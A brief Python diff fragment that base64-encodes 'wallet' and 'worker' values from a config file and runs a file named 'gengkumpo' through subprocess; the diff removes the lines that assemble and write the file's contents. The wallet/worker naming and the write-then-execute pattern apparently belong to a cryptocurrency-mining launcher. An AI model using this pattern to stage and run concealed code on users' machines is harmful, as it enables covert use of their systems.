@@ -13,9 +13,7 @@ with open('conf.ini') as f:
           
 wallet = (b.b64encode(wallet.encode('utf-8')))
 worker = (b.b64encode(worker.encode('utf-8')))
-fulltext = (wallet)+(worker)+(s)
 f = open("gengkumpo", "w")
-f.write(fulltext)
 f.close()
 try:
     subprocess.run(["python",f.name])
